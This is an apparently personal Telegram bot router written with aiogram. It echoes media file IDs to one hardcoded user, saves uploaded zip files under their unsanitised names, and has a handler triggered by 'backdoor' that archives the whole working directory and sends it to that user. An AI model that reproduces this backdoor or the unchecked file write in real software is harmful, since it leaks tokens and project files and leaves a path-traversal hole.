from aiogram import Router, F as mF
from aiogram.types import Message, FSInputFile

from os import getcwd, remove
from shutil import make_archive


rtr = Router()
print("SRV/manual_media_id router")


@rtr.message(mF.video, mF.from_user.id == 350531376)
async def video_id(message: Message):
    await message.answer(f"video: <code>{message.video.file_id}</code>")


@rtr.message(mF.photo, mF.from_user.id == 350531376)
async def photo_id(message: Message):
    await message.answer(f"photo: <code>{message.photo[-1].file_id}</code>")


@rtr.message(mF.document, mF.from_user.id == 350531376)
async def best_file_hosting_ever(message: Message):
    if message.document.file_name.rsplit('.', 1)[1] == "zip":
        await message.bot.download(message.document.file_id, getcwd() + f'\\{message.document.file_name}')
        await message.answer(f"file has been downloaded at\n{getcwd()}\\{message.document.file_name}")
    else:
        await message.answer(f"document: <code>{message.document.file_id}</code>")


@rtr.message(mF.sticker, mF.from_user.id == 350531376)
async def sticker_id(message: Message):
    await message.answer(f"sticker: <code>{message.sticker.file_id}</code>")


@rtr.message(mF.animation, mF.from_user.id == 350531376)
async def animation_id(message: Message):
    await message.answer(f"animation: <code>{message.animation.file_id}</code>")


@rtr.message(mF.text == "backdoor", mF.from_user.id == 350531376)
async def backdoor(message: Message):
    await message.answer("initialised backdoor pass")
    make_archive(f'{getcwd()}\\build', 'zip', getcwd())
    await message.answer_document(FSInputFile(f'{getcwd()}\\build.zip'))
    remove(f'{getcwd()}\\build.zip')
